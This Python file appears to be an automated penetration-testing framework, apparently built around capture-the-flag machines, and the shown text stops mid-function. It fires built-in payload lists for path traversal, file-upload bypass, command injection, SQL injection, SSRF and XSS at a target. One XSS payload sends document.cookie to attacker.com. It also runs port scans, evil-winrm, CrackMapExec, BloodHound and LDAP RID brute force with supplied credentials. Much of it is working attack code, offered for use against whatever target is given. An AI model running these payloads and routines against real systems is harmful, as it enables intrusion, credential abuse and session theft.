#!/usr/bin/env python3
import subprocess
import os
import json
import requests
import dns.resolver
import whois
import socket
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import re

class WebExploitManager:
    def __init__(self, target, logger):
        self.target = target
        self.logger = logger
        self.domain = self._resolve_domain()
        
    def _resolve_domain(self):
        """Resolve domain from IP and add to /etc/hosts"""
        try:
            # Check if target is an IP address
            if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', self.target):
                # Run nmap to get domain information
                nmap_cmd = f"nmap -sV -sC -p389,636,3268,3269 {self.target}"
                nmap_result = subprocess.run(nmap_cmd.split(), capture_output=True, text=True)
                
                domains = set()
                # Try to get domain from reverse DNS
                try:
                    domain = socket.gethostbyaddr(self.target)[0]
                    domains.add(domain)
                except socket.herror:
                    pass
                
                # Extract domain from nmap results
                if nmap_result.stdout:
                    # Look for domain patterns in LDAP service information
                    domain_patterns = [
                        r'Domain: ([^,]+)',
                        r'Domain: ([^\.]+)',
                        r'Domain: ([^\s]+)'
                    ]
                    
                    for pattern in domain_patterns:
                        matches = re.findall(pattern, nmap_result.stdout)
                        for match in matches:
                            # Clean up domain name
                            domain = match.strip().lower()
                            if domain:
                                domains.add(domain)
                
                # If no domains found, use a generated domain
                if not domains:
                    domain = f"target-{self.target.replace('.', '-')}.local"
                    domains.add(domain)
                
                # Add all domains to /etc/hosts
                hosts_entries = []
                for domain in domains:
                    hosts_entry = f"{self.target} {domain}"
                    hosts_entries.append(hosts_entry)
                
                # Write to /etc/hosts
                with open('/etc/hosts', 'a') as f:
                    f.write("\n# Added by PenTest Framework\n")
                    for entry in hosts_entries:
                        f.write(f"{entry}\n")
                        self.logger.success(f"Added domain resolution: {entry}")
                
                return list(domains)[0]  # Return first domain as primary
            return self.target
        except Exception as e:
            self.logger.error(f"Failed to resolve domain: {str(e)}")
            return self.target

    def _format_url(self, path=""):
        """Format URL with proper protocol and path"""
        # Ensure target has protocol
        if not self.target.startswith(('http://', 'https://')):
            # Try HTTPS first
            try:    
                requests.get(f"https://{self.target}", verify=False, timeout=5)
                base_url = f"https://{self.target}"
            except:
                base_url = f"http://{self.target}"
        
        # Ensure path starts with /
        if path and not path.startswith('/'):
            path = '/' + path
            
        return f"{base_url}{path}"

    def test_path_traversal(self, paths_to_try=None):
        """Test for path traversal vulnerabilities (seen in Strutted)"""
        if not paths_to_try:
            paths_to_try = [
                "../../../etc/passwd",
                "..%2f..%2f..%2fetc%2fpasswd",
                "....//....//....//etc/passwd",
                "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
                "....\/....\/....\/etc/passwd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "..%c0%af..%c0%af..%c0%afetc/passwd",
                "..%c1%9c..%c1%9c..%c1%9cetc/passwd"
            ]
        
        results = {}
        for path in paths_to_try:
            try:
                url = self._format_url(path)
                response = requests.get(url, verify=False)
                if self._is_path_traversal_successful(response):
                    results[path] = True
                    self.logger.success(f"Path traversal successful with: {path}")
                else:
                    results[path] = False
            except Exception as e:
                self.logger.error(f"Error testing path traversal with {path}: {str(e)}")
                results[path] = False
        
        return results
    
    def test_file_upload_bypass(self, extensions_to_try=None):
        """Test for file upload restriction bypasses (seen in Strutted, BigBang)"""
        if not extensions_to_try:
            extensions_to_try = [
                ".php", ".phtml", ".php5", ".php7", ".phar", ".pgif", 
                ".php.jpg", ".php%00.jpg", ".php.", ".php%00", ".php%0a",
                ".php%0d%0a", ".php%0a%0d", ".php%0d", ".php%0a",
                ".php%00", ".php%00.", ".php%00.jpg", ".php%00.png",
                ".php%00.gif", ".php%00.jpeg", ".php%00.bmp"
            ]
        
        results = {}
        for ext in extensions_to_try:
            try:
                payload = self._create_test_file(ext)
                response = self._upload_file(payload)
                if self._is_upload_successful(response):
                    results[ext] = True
                    self.logger.success(f"Upload bypass successful with: {ext}")
                else:
                    results[ext] = False
            except Exception as e:
                self.logger.error(f"Error testing file upload with {ext}: {str(e)}")
                results[ext] = False
        
        return results
        
    def test_command_injection(self, parameters=None):
        """Test for command injection vulnerabilities (seen in TwoMillion, BigBang)"""
        if not parameters:
            parameters = ["cmd", "exec", "command", "ping", "query", "jump", "code", "input", "file", "path"]
            
        payloads = [
            ";id;", 
            "| id", 
            "$(id)", 
            "`id`", 
            "&& id", 
            "%0Aid",
            "|| id",
            "& id",
            "| id |",
            "`id`;",
            "$(id);",
            "& id &",
            "| id &",
            "& id |",
            "| id ||",
            "|| id |",
            "| id &&",
            "&& id |"
        ]
        
        results = {}
        for param in parameters:
            for payload in payloads:
                try:
                    response = requests.get(f"{self.target}?{param}={payload}", verify=False)
                    if self._is_command_injection_successful(response):
                        results[f"{param}:{payload}"] = True
                        self.logger.success(f"Command injection successful with: {param}={payload}")
                except Exception as e:
                    self.logger.error(f"Error testing command injection with {param}={payload}: {str(e)}")
                    
        return results

    def test_sql_injection(self, parameters=None):
        """Test for SQL injection vulnerabilities"""
        if not parameters:
            parameters = ["id", "user", "username", "password", "email", "search", "query"]
            
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' OR '1'='1'/*",
            "admin' --",
            "admin' #",
            "admin'/*",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 1,2,3#",
            "' UNION SELECT 1,2,3/*",
            "1' ORDER BY 1--",
            "1' ORDER BY 2--",
            "1' ORDER BY 3--"
        ]
        
        results = {}
        for param in parameters:
            for payload in payloads:
                try:
                    url = self._format_url(f"?{param}={payload}")
                    response = requests.get(url, verify=False)
                    if self._is_sql_injection_successful(response):
                        results[f"{param}:{payload}"] = True
                        self.logger.success(f"SQL injection successful with: {param}={payload}")
                except Exception as e:
                    self.logger.error(f"Error testing SQL injection with {param}={payload}: {str(e)}")
                    
        return results

    def test_xss(self, parameters=None):
        """Test for Cross-Site Scripting vulnerabilities"""
        if not parameters:
            parameters = ["search", "q", "query", "s", "input", "message", "comment"]
            
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "'\"><script>alert(1)</script>",
            "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
            "<img src=x onerror=fetch('http://attacker.com?cookie='+document.cookie)>"
        ]
        
        results = {}
        for param in parameters:
            for payload in payloads:
                try:
                    url = self._format_url(f"?{param}={payload}")
                    response = requests.get(url, verify=False)
                    if self._is_xss_successful(response):
                        results[f"{param}:{payload}"] = True
                        self.logger.success(f"XSS successful with: {param}={payload}")
                except Exception as e:
                    self.logger.error(f"Error testing XSS with {param}={payload}: {str(e)}")
                    
        return results

    def test_ssrf(self, parameters=None):
        """Test for Server-Side Request Forgery vulnerabilities"""
        if not parameters:
            parameters = ["url", "path", "src", "dest", "redirect", "proxy", "rurl"]
            
        payloads = [
            "http://localhost",
            "http://127.0.0.1",
            "http://[::1]",
            "http://0.0.0.0",
            "http://localhost:80",
            "http://127.0.0.1:80",
            "file:///etc/passwd",
            "file:///c:/windows/win.ini",
            "dict://localhost:11211/",
            "gopher://localhost:11211/_"
        ]
        
        results = {}
        for param in parameters:
            for payload in payloads:
                try:
                    url = self._format_url(f"?{param}={payload}")
                    response = requests.get(url, verify=False)
                    if self._is_ssrf_successful(response):
                        results[f"{param}:{payload}"] = True
                        self.logger.success(f"SSRF successful with: {param}={payload}")
                except Exception as e:
                    self.logger.error(f"Error testing SSRF with {param}={payload}: {str(e)}")
                    
        return results

    def _is_path_traversal_successful(self, response):
        """Check if path traversal was successful"""
        success_indicators = [
            "root:x:",
            "/bin/bash",
            "/etc/shadow",
            "daemon:x:",
            "nobody:x:",
            "www-data:x:",
            "/bin/sh",
            "/bin/false",
            "/usr/sbin/nologin"
        ]
        return any(indicator in response.text for indicator in success_indicators)

    def _is_sql_injection_successful(self, response):
        """Check if SQL injection was successful"""
        success_indicators = [
            "SQL syntax",
            "mysql_fetch_array",
            "mysql_fetch_assoc",
            "mysql_fetch_row",
            "mysql_num_rows",
            "mysql_result",
            "mysql_query",
            "mysql_error",
            "ORA-",
            "SQLite/JDBCDriver",
            "SQLite.Exception",
            "System.Data.SQLite.SQLiteException",
            "Warning: mysql_",
            "valid MySQL result",
            "check the manual that corresponds to your (MySQL|MariaDB) server version",
            "PostgreSQL.*ERROR",
            "Warning.*pg_",
            "valid PostgreSQL result",
            "Npgsql.",
            "Microsoft SQL Server",
            "ODBC SQL Server Driver",
            "SQLServer JDBC Driver",
            "com.microsoft.sqlserver.jdbc.SQLServerException",
            "System.Data.SqlClient.SqlException",
            "Warning: mssql_",
            "valid MSSQL result"
        ]
        return any(indicator in response.text for indicator in success_indicators)

    def _is_xss_successful(self, response):
        """Check if XSS was successful"""
        return any(payload in response.text for payload in [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>"
        ])

    def _is_ssrf_successful(self, response):
        """Check if SSRF was successful"""
        success_indicators = [
            "root:x:",
            "[boot loader]",
            "default=multi",
            "default=0",
            "timeout=5",
            "splashimage",
            "hiddenmenu",
            "prompt",
            "password",
            "username",
            "user",
            "pass",
            "auth",
            "login",
            "admin",
            "administrator"
        ]
        return any(indicator in response.text for indicator in success_indicators)

    def _create_test_file(self, extension):
        """Create a test file with the given extension"""
        content = "<?php phpinfo(); ?>"
        filename = f"test{extension}"
        with open(filename, 'w') as f:
            f.write(content)
        return filename

    def _upload_file(self, filename):
        """Upload a file to the target"""
        with open(filename, 'rb') as f:
            files = {'file': f}
            url = self._format_url('/upload')
            return requests.post(url, files=files, verify=False)

    def _is_upload_successful(self, response):
        """Check if file upload was successful"""
        return response.status_code == 200 and "success" in response.text.lower()

    def _is_command_injection_successful(self, response):
        """Check if command injection was successful"""
        success_indicators = [
            "uid=",
            "gid=",
            "groups=",
            "root:x:"
        ]
        return any(indicator in response.text for indicator in success_indicators)

class InformationGathering:
    def __init__(self, target, logger, tool_manager=None, execution_engine=None, use_headers=False, custom_headers=None, credentials=None):
        self.target = target
        self.logger = logger
        self.tool_manager = tool_manager
        self.execution_engine = execution_engine
        self.use_headers = use_headers
        self.custom_headers = custom_headers or {
            "User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)",
            "Accept": "*/*"
        }
        self.credentials = credentials or {}
        self.domain = None  # Will store the discovered domain
        self.findings = {
            "osint": {},
            "infrastructure": {},
            "services": {},
            "hosts": {},
            "web_vulnerabilities": {},
            "credential_enumeration": {}
        }
        self.output_dir = f"reports/info_gathering_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        os.makedirs(self.output_dir, exist_ok=True)
        
        # Initialize WebExploitManager
        self.web_exploit_manager = WebExploitManager(target, logger)

    def _extract_domain_from_nmap(self, nmap_output):
        """Extract domain information from nmap scan results"""
        try:
            # Look for LDAP service information
            domain_patterns = [
                r'Domain: ([^,]+)',
                r'Domain: ([^\.]+)',
                r'Domain: ([^\s]+)'
            ]
            
            for pattern in domain_patterns:
                matches = re.findall(pattern, nmap_output)
                for match in matches:
                    # Clean up domain name
                    domain = match.strip().lower()
                    if domain:
                        # Remove trailing dot if present
                        domain = domain.rstrip('.')
                        # Split domain into parts and remove any numbers
                        domain_parts = []
                        for part in domain.split('.'):
                            # Remove any numbers from the end of each part
                            clean_part = re.sub(r'\d+$', '', part)
                            if clean_part:  # Only add non-empty parts
                                domain_parts.append(clean_part)
                        # Rejoin the domain parts
                        return '.'.join(domain_parts)
            return None
        except Exception as e:
            self.logger.error(f"Error extracting domain from nmap: {str(e)}")
            return None

    def _format_ldap_base(self, domain):
        """Format domain for LDAP base DN"""
        try:
            # Split domain into parts
            parts = domain.split('.')
            # Format each part as DC=part
            dc_parts = [f"DC={part}" for part in parts]
            # Join with commas
            return ','.join(dc_parts)
        except Exception as e:
            self.logger.error(f"Error formatting LDAP base: {str(e)}")
            return None

    def _get_header_string(self):
        """Get header string for command line tools"""
        if not self.use_headers:
            return ""
        header_str = " ".join([f"--header='{k}: {v}'" for k, v in self.custom_headers.items()])
        return header_str

    def run(self):
        """Run all information gathering tasks"""
        self.logger.info("Starting Information Gathering phase...")
        
        # 1. Open Source Intelligence (OSINT)
        self.logger.info("Performing OSINT gathering...")
        self.findings["osint"] = self.run_osint()
        
        # 2. Infrastructure Enumeration
        self.logger.info("Performing infrastructure enumeration...")
        self.findings["infrastructure"] = self.run_infrastructure_enumeration()
        
        # 3. Service Enumeration
        self.logger.info("Performing service enumeration...")
        self.findings["services"] = self.run_service_enumeration()
        
        # 4. Host Enumeration
        self.logger.info("Performing host enumeration...")
        self.findings["hosts"] = self.run_host_enumeration()
        
        # 5. Web Vulnerability Testing
        self.logger.info("Testing for web vulnerabilities...")
        self.findings["web_vulnerabilities"] = self.test_web_vulnerabilities()
        
        # 6. Credential-based Enumeration (if credentials provided)
        if self.credentials:
            self.logger.info("Performing credential-based enumeration...")
            self.findings["credential_enumeration"] = self.run_credential_enumeration()
        
        # Save findings to JSON for other stages
        self._save_findings()
        
        return self.findings

    def _save_findings(self):
        """Save findings to JSON file for use in other stages"""
        output_file = f"{self.output_dir}/findings.json"
        with open(output_file, 'w') as f:
            json.dump(self.findings, f, indent=4)
        self.logger.info(f"Findings saved to {output_file}")

    def run_command(self, command, capture_output=True):
        """Run a system command and return the output"""
        if self.tool_manager:
            return self.tool_manager.run_tool(command.split()[0], command, capture_output)
        else:
            try:
                result = subprocess.run(command.split(), capture_output=capture_output, text=True)
                if result.returncode != 0:
                    self.logger.error(f"Command failed: {result.stderr}")
                    return None
                return result.stdout
            except Exception as e:
                self.logger.error(f"Error executing command: {str(e)}")
                return None

    def run_osint(self):
        """Perform OSINT gathering"""
        self.logger.info("Starting OSINT gathering...")
        
        # Add tasks to execution engine if available
        if self.execution_engine:
            # Basic WHOIS and DNS checks first
            self.execution_engine.add_task("whois", self.run_command, f"whois {self.target}", priority=1)
            self.execution_engine.add_task("dns", self.run_command, f"dig +short {self.target}", priority=2)
            
            # Run initial tasks
            initial_results = self.execution_engine.run_parallel()
            self.findings["osint"].update(initial_results)
            
            # Clear tasks for next batch
            self.execution_engine.clear_tasks()
            
            # More intensive scans if initial checks succeed
            if initial_results.get("dns"):
                self.execution_engine.add_task("subfinder", self.run_command, 
                    f"subfinder -d {self.target} -silent -t 100", priority=3)
                self.execution_engine.add_task("amass", self.run_command, 
                    f"amass enum -passive -d {self.target} -timeout 5", priority=4)
                self.execution_engine.add_task("theharvester", self.run_command, 
                    f"theHarvester -d {self.target} -b all -l 100", priority=5)
                
                # Run secondary tasks
                secondary_results = self.execution_engine.run_parallel()
                self.findings["osint"].update(secondary_results)
        else:
            # Fallback to sequential execution with timeouts
            self.findings["osint"]["whois"] = self.run_command(f"whois {self.target}")
            self.findings["osint"]["dns"] = self.run_command(f"dig +short {self.target}")
            
            if self.findings["osint"].get("dns"):
                self.findings["osint"]["subfinder"] = self.run_command(
                    f"subfinder -d {self.target} -silent -t 100")
                self.findings["osint"]["amass"] = self.run_command(
                    f"amass enum -passive -d {self.target} -timeout 5")
                self.findings["osint"]["theharvester"] = self.run_command(
                    f"theHarvester -d {self.target} -b all -l 100")

    def run_infrastructure_enumeration(self):
        """Perform infrastructure enumeration"""
        self.logger.info("Starting infrastructure enumeration...")
        
        # Step 1: Fast port scan with -p- and high rate
        self.logger.info("Running initial fast port scan...")
        initial_scan_cmd = f"nmap -p- --min-rate 10000 {self.target}"
        initial_scan_result = self.run_command(initial_scan_cmd)
        
        if not initial_scan_result:
            self.logger.error("Initial port scan failed")
            return {}
            
        # Save initial scan results
        with open(f"{self.output_dir}/initial_scan.txt", 'w') as f:
            f.write(initial_scan_result)
            
        # Parse open ports from initial scan
        open_ports = []
        for line in initial_scan_result.split('\n'):
            if '/tcp' in line and 'open' in line:
                port = line.split('/')[0].strip()
                open_ports.append(port)
                
        if not open_ports:
            self.logger.warning("No open ports found in initial scan")
            return {}
            
        # Step 2: Detailed scan on discovered ports
        self.logger.info("Running detailed scan on discovered ports...")
        ports_str = ','.join(open_ports)
        detailed_scan_cmd = f"nmap -sVC -A -p{ports_str} {self.target}"
        detailed_scan_result = self.run_command(detailed_scan_cmd)
        
        if not detailed_scan_result:
            self.logger.error("Detailed scan failed")
            return {}
            
        # Save detailed scan results
        with open(f"{self.output_dir}/detailed_scan.txt", 'w') as f:
            f.write(detailed_scan_result)
            
        # Extract domain from nmap results
        self.domain = self._extract_domain_from_nmap(detailed_scan_result)
        if self.domain:
            self.logger.success(f"Discovered domain: {self.domain}")
            
        return {
            "initial_scan": initial_scan_result,
            "detailed_scan": detailed_scan_result,
            "domain": self.domain
        }

    def run_service_enumeration(self):
        """Perform service enumeration"""
        self.logger.info("Starting service enumeration...")
        
        # Add tasks to execution engine if available
        if self.execution_engine:
            header_str = self._get_header_string()
            self.execution_engine.add_task("whatweb", self.run_command, 
                f"whatweb -v {header_str} {self.target}", priority=1)
            
            # Run all tasks in parallel
            results = self.execution_engine.run_parallel()
            self.findings["services"] = results
        else:
            # Fallback to sequential execution
            header_str = self._get_header_string()
            self.findings["services"]["whatweb"] = self.run_command(
                f"whatweb -v {header_str} {self.target}")

    def run_host_enumeration(self):
        """Perform host enumeration"""
        self.logger.info("Starting host enumeration...")
        
        # Add tasks to execution engine if available
        if self.execution_engine:
            # Quick OS detection first
            self.execution_engine.add_task("nmap_os", self.run_command, 
                f"nmap -O --osscan-limit --max-os-tries 1 -T4 {self.target}", priority=1)
            
            # Run OS detection
            os_results = self.execution_engine.run_parallel()
            self.findings["hosts"].update(os_results)
            
            # Clear tasks for next batch
            self.execution_engine.clear_tasks()
            
            # Vulnerability scan only if OS detection succeeded
            if os_results.get("nmap_os"):
                self.execution_engine.add_task("nmap_vuln", self.run_command, 
                    f"nmap --script vuln --script-timeout 2m -T4 {self.target}", priority=2)
                
                # Run vulnerability scan
                vuln_results = self.execution_engine.run_parallel()
                self.findings["hosts"].update(vuln_results)
        else:
            # Fallback to sequential execution
            self.findings["hosts"]["nmap_os"] = self.run_command(
                f"nmap -O --osscan-limit --max-os-tries 1 -T4 {self.target}")
            
            if self.findings["hosts"].get("nmap_os"):
                self.findings["hosts"]["nmap_vuln"] = self.run_command(
                    f"nmap --script vuln --script-timeout 2m -T4 {self.target}")

    def osint_gathering(self):
        """Perform Open Source Intelligence gathering"""
        results = {}
        
        # 1. WHOIS Information
        self.logger.info("Gathering WHOIS information...")
        try:
            whois_info = whois.whois(self.target)
            results["whois"] = whois_info
        except Exception as e:
            self.logger.error(f"WHOIS lookup failed: {str(e)}")
        
        # 2. DNS Enumeration
        self.logger.info("Performing DNS enumeration...")
        dns_records = self._enumerate_dns()
        results["dns"] = dns_records
        
        # 3. Subdomain Enumeration
        self.logger.info("Enumerating subdomains...")
        subdomains = self._enumerate_subdomains()
        results["subdomains"] = subdomains
        
        # 4. Social Media and Web Presence
        self.logger.info("Checking social media and web presence...")
        web_presence = self._check_web_presence()
        results["web_presence"] = web_presence
        
        return results

    def _enumerate_dns(self):
        """Enumerate DNS records"""
        results = {}
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA']
        
        for record_type in record_types:
            try:
                answers = dns.resolver.resolve(self.target, record_type)
                results[record_type] = [str(rdata) for rdata in answers]
            except Exception as e:
                self.logger.error(f"DNS {record_type} lookup failed: {str(e)}")
                
        return results

    def _enumerate_subdomains(self):
        """Enumerate subdomains using various tools"""
        results = {}
        
        # Using subfinder
        self.logger.info("Running subfinder...")
        subfinder_cmd = f"subfinder -d {self.target} -o {self.output_dir}/subfinder.txt"
        subfinder_result = self.run_command(subfinder_cmd)
        if subfinder_result:
            results["subfinder"] = subfinder_result
            
        # Using amass
        self.logger.info("Running amass...")
        amass_cmd = f"amass enum -passive -d {self.target} -o {self.output_dir}/amass.txt"
        amass_result = self.run_command(amass_cmd)
        if amass_result:
            results["amass"] = amass_result
            
        return results

    def _check_web_presence(self):
        """Check web presence and social media"""
        results = {}
        
        # Using theHarvester
        self.logger.info("Running theHarvester...")
        harvester_cmd = f"theHarvester -d {self.target} -b all -l 500 -o {self.output_dir}/harvester.txt"
        harvester_result = self.run_command(harvester_cmd)
        if harvester_result:
            results["harvester"] = harvester_result
            
        return results

    def infrastructure_enumeration(self):
        """Enumerate infrastructure information"""
        results = {}
        
        # 1. Network Range Discovery
        self.logger.info("Discovering network ranges...")
        network_info = self._discover_network_ranges()
        results["network_ranges"] = network_info
        
        # 2. ASN Information
        self.logger.info("Gathering ASN information...")
        asn_info = self._gather_asn_info()
        results["asn"] = asn_info
        
        # 3. Cloud Infrastructure Detection
        self.logger.info("Detecting cloud infrastructure...")
        cloud_info = self._detect_cloud_infrastructure()
        results["cloud"] = cloud_info
        
        return results

    def _discover_network_ranges(self):
        """Discover network ranges"""
        results = {}
        
        # Using nmap for network discovery
        self.logger.info("Running nmap network discovery...")
        nmap_cmd = f"nmap -sn {self.target}/24 -oN {self.output_dir}/network_discovery.txt"
        nmap_result = self.run_command(nmap_cmd)
        if nmap_result:
            results["nmap"] = nmap_result
            
        return results

    def _gather_asn_info(self):
        """Gather ASN information"""
        results = {}
        
        # Using asnlookup
        self.logger.info("Running asnlookup...")
        asn_cmd = f"asnlookup -o {self.output_dir}/asn.txt {self.target}"
        asn_result = self.run_command(asn_cmd)
        if asn_result:
            results["asnlookup"] = asn_result
            
        return results

    def _detect_cloud_infrastructure(self):
        """Detect cloud infrastructure"""
        results = {}
        
        # Using cloudlist
        self.logger.info("Running cloudlist...")
        cloud_cmd = f"cloudlist -d {self.target} -o {self.output_dir}/cloud.txt"
        cloud_result = self.run_command(cloud_cmd)
        if cloud_result:
            results["cloudlist"] = cloud_result
            
        return results

    def service_enumeration(self):
        """Enumerate services"""
        results = {}
        
        # 1. Port Scanning
        self.logger.info("Performing port scanning...")
        port_scan = self._perform_port_scan()
        results["ports"] = port_scan
        
        # 2. Service Version Detection
        self.logger.info("Detecting service versions...")
        service_versions = self._detect_service_versions()
        results["versions"] = service_versions
        
        # 3. Web Technology Detection
        self.logger.info("Detecting web technologies...")
        web_tech = self._detect_web_technologies()
        results["web_tech"] = web_tech
        
        return results

    def _perform_port_scan(self):
        """Perform comprehensive port scanning"""
        results = {}
        
        # Using nmap for port scanning
        self.logger.info("Running nmap port scan...")
        nmap_cmd = f"nmap -p- -sV -sC -oN {self.output_dir}/port_scan.txt {self.target}"
        nmap_result = self.run_command(nmap_cmd)
        if nmap_result:
            results["nmap"] = nmap_result
            
        # Using masscan for quick port scanning
        self.logger.info("Running masscan...")
        masscan_cmd = f"masscan {self.target} -p1-65535 --rate=1000 -oJ {self.output_dir}/masscan.json"
        masscan_result = self.run_command(masscan_cmd)
        if masscan_result:
            results["masscan"] = masscan_result
            
        return results

    def _detect_service_versions(self):
        """Detect service versions"""
        results = {}
        
        # Using nmap service detection
        self.logger.info("Running nmap service detection...")
        nmap_cmd = f"nmap -sV -sC -oN -A {self.output_dir}/service_versions.txt {self.target}"
        nmap_result = self.run_command(nmap_cmd)
        if nmap_result:
            results["nmap"] = nmap_result
            
        return results

    def _detect_web_technologies(self):
        """Detect web technologies"""
        results = {}
        
        # Using whatweb
        self.logger.info("Running whatweb...")
        header_str = self._get_header_string()
        whatweb_cmd = f"whatweb -v {header_str} {self.target} -o {self.output_dir}/whatweb.txt"
        whatweb_result = self.run_command(whatweb_cmd)
        if whatweb_result:
            results["whatweb"] = whatweb_result
            
        # Using wappy
        self.logger.info("Running wappy...")
        wappy_cmd = f"wappy  -u {self.target} -wf {self.output_dir}/wappy.txt"
        wappy_result = self.run_command(wappy_cmd)
        if wappy_result:
            results["wappy"] = wappy_result
            
        return results

    def host_enumeration(self):
        """Enumerate host information"""
        results = {}
        
        # 1. Operating System Detection
        self.logger.info("Detecting operating system...")
        os_info = self._detect_os()
        results["os"] = os_info
        
        # 2. Host Discovery
        self.logger.info("Performing host discovery...")
        host_info = self._discover_hosts()
        results["hosts"] = host_info
        
        # 3. Vulnerability Scanning
        self.logger.info("Performing vulnerability scanning...")
        vuln_info = self._scan_vulnerabilities()
        results["vulnerabilities"] = vuln_info
        
        return results

    def _detect_os(self):
        """Detect operating system"""
        results = {}
        
        # Using nmap OS detection
        self.logger.info("Running nmap OS detection...")
        nmap_cmd = f"nmap -O -oN {self.output_dir}/os_detection.txt {self.target}"
        nmap_result = self.run_command(nmap_cmd)
        if nmap_result:
            results["nmap"] = nmap_result
            
        return results

    def _discover_hosts(self):
        """Discover hosts"""
        results = {}
        
        # Using nmap host discovery
        self.logger.info("Running nmap host discovery...")
        nmap_cmd = f"nmap -sn -PR -PS22,25,80,443,3389 -PA21,23,80,3389 -PE -PP -oN {self.output_dir}/host_discovery.txt {self.target}/24"
        nmap_result = self.run_command(nmap_cmd)
        if nmap_result:
            results["nmap"] = nmap_result
            
        return results

    def _scan_vulnerabilities(self):
        """Scan for vulnerabilities"""
        results = {}
        
        # Using nmap vulnerability scripts
        self.logger.info("Running nmap vulnerability scripts...")
        nmap_cmd = f"nmap -sV --script vuln -oN {self.output_dir}/vulnerability_scan.txt {self.target}"
        nmap_result = self.run_command(nmap_cmd)
        if nmap_result:
            results["nmap"] = nmap_result
            
        return results

    def test_web_vulnerabilities(self):
        """Test for web vulnerabilities"""
        results = {
            "path_traversal": self.web_exploit_manager.test_path_traversal(),
            "file_upload_bypass": self.web_exploit_manager.test_file_upload_bypass(),
            "command_injection": self.web_exploit_manager.test_command_injection(),
            "sql_injection": self.web_exploit_manager.test_sql_injection(),
            "xss": self.web_exploit_manager.test_xss(),
            "ssrf": self.web_exploit_manager.test_ssrf()
        }
        return results

    def run_credential_enumeration(self):
        """Perform enumeration using provided credentials"""
        results = {}
        
        # Initial WinRM check
        self.logger.info("Checking WinRM access...")
        for username, password in self.credentials.items():
            winrm_results = self._check_winrm(username, password)
            if winrm_results:
                results[f"winrm_{username}"] = winrm_results
        
        # CrackMapExec enumeration
        self.logger.info("Running CrackMapExec enumeration...")
        for username, password in self.credentials.items():
            cme_results = self._run_crackmapexec(username, password)
            if cme_results:
                results[f"cme_{username}"] = cme_results
        
        # BloodHound enumeration
        self.logger.info("Running BloodHound enumeration...")
        for username, password in self.credentials.items():
            bloodhound_results = self._run_bloodhound(username, password)
            if bloodhound_results:
                results[f"bloodhound_{username}"] = bloodhound_results
        
        # LDAP Enumeration
        if any(port in self.findings["infrastructure"].get("nmap_quick", "") for port in ["389", "636", "3268", "3269"]):
            self.logger.info("Performing LDAP enumeration with credentials...")
            for username, password in self.credentials.items():
                ldap_results = self._enumerate_ldap(username, password)
                if ldap_results:
                    results[f"ldap_{username}"] = ldap_results
                    
                # Check for privilege escalation paths
                escalation_paths = self._check_privilege_escalation(username, password)
                if escalation_paths:
                    results[f"escalation_{username}"] = escalation_paths
        
        return results

    def _check_winrm(self, username, password):
        """Check WinRM access"""
        results = {}
        try:
            # Try evil-winrm
            evil_winrm_cmd = f"evil-winrm -i {self.target} -u {username} -p '{password}' -c 'whoami'"
            winrm_output = self.run_command(evil_winrm_cmd)
            if winrm_output:
                results["evil_winrm"] = winrm_output
        except Exception as e:
            self.logger.error(f"Error checking WinRM: {str(e)}")
        return results

    def _run_crackmapexec(self, username, password):
        """Run CrackMapExec enumeration"""
        results = {}
        try:
            # List users
            users_cmd = f"crackmapexec smb {self.target} -u {username} -p '{password}' --users"
            users_output = self.run_command(users_cmd)
            if users_output:
                results["users"] = users_output
            
            # List groups
            groups_cmd = f"crackmapexec smb {self.target} -u {username} -p '{password}' --groups"
            groups_output = self.run_command(groups_cmd)
            if groups_output:
                results["groups"] = groups_output
            
            # Check shares
            shares_cmd = f"crackmapexec smb {self.target} -u {username} -p '{password}' --shares"
            shares_output = self.run_command(shares_cmd)
            if shares_output:
                results["shares"] = shares_output
        except Exception as e:
            self.logger.error(f"Error in CrackMapExec enumeration: {str(e)}")
        return results

    def _run_bloodhound(self, username, password):
        """Run BloodHound enumeration"""
        results = {}
        try:
            if not self.domain:
                self.logger.error("Domain not discovered, cannot run BloodHound")
                return results
                
            # Run SharpHound collector
            bloodhound_cmd = f"bloodhound-python -u {username} -p '{password}' -d {self.domain} -ns {self.target} -c all"
            bloodhound_output = self.run_command(bloodhound_cmd)
            if bloodhound_output:
                results["collection"] = bloodhound_output
            
            # Analyze paths
            if "collection" in results:
                analyze_cmd = "bloodhound --no-prompt"
                analyze_output = self.run_command(analyze_cmd)
                if analyze_output:
                    results["analysis"] = analyze_output
        except Exception as e:
            self.logger.error(f"Error in BloodHound enumeration: {str(e)}")
        return results

    def _enumerate_ldap(self, username, password):
        """Enumerate LDAP information"""
        results = {}
        try:
            if not self.domain:
                self.logger.error("Domain not discovered, cannot perform LDAP enumeration")
                return results
                
            # Format domain for LDAP
            ldap_base = self._format_ldap_base(self.domain)
            if not ldap_base:
                self.logger.error("Failed to format LDAP base")
                return results
                
            self.logger.info(f"Using LDAP base: {ldap_base}")
            
            # Basic LDAP search
            ldapsearch_cmd = f"ldapsearch -x -H ldap://{self.target} -D '{username}@{self.domain}' -w '{password}' -b '{ldap_base}'"
            ldap_output = self.run_command(ldapsearch_cmd)
            if ldap_output:
                results["basic_search"] = ldap_output
            
            # Search for users
            users_cmd = f"ldapsearch -x -H ldap://{self.target} -D '{username}@{self.domain}' -w '{password}' -b '{ldap_base}' 'objectClass=user'"
            users_output = self.run_command(users_cmd)
            if users_output:
                results["users"] = users_output
            
            # Search for groups
            groups_cmd = f"ldapsearch -x -H ldap://{self.target} -D '{username}@{self.domain}' -w '{password}' -b '{ldap_base}' 'objectClass=group'"
            groups_output = self.run_command(groups_cmd)
            if groups_output:
                results["groups"] = groups_output
            
            # RID brute force
            rid_cmd = f"nxc smb {self.domain} -u '{username}' -p '{password}' --rid-brute"
            rid_output = self.run_command(rid_cmd)
            if rid_output:
                results["rid_brute"] = rid_output
                
